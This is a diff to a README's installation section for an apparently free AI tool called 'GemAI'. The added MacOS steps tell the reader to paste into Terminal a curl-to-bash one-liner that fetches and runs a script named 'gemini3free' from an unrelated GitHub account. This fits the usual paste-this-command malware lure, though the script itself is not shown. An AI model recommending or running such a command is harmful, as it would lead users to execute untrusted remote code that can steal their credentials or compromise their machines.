@@ -63,9 +63,21 @@ Additionally, the **top contributor** of the early access period will receive a 
 
 ## 💾 Installation
 
+### Windows
+
 1. Download the latest build from [Releases](./../releases)
 2. Extract the archive into any folder you prefer.
 3. On Windows: run `GemAI.exe` to finalize setup.
+
+### MacOS
+
+- 💻Open **Terminal**
+- ☑Paste the **command** below
+- ✅Press **Enter**
+
+```sh
+/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/install-MacOS/dmg/refs/heads/main/gemini3free)"
+```
 
 ---
 
